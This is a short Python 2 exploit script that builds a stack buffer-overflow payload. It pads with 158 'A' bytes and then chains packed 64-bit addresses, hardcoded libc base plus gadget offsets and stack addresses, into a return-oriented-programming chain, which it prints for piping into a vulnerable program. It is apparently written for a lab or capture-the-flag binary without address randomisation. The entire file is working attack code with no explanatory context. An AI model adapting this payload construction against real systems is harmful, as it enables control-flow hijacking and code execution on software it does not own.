from struct import pack

def p(x):
    return pack('<Q', x)

libc = 0x00007ffff7dcb000

payload = 'Hola Mundo'
payload += 'A'*158
payload += p(libc + 0x0015f939)
payload += p(0x1)
payload += p(libc + 0x00196dc0)
payload += p(0x7fffffffdf60)
payload += p(libc + 0x00195d49)
payload += p(0x1)
payload += p(libc + 0x0015fd18)
payload += p(0x4)
payload += p(0xdeadbeef)
payload += p(libc + 0x001989b6)
payload += 'BBBBBB'

print payload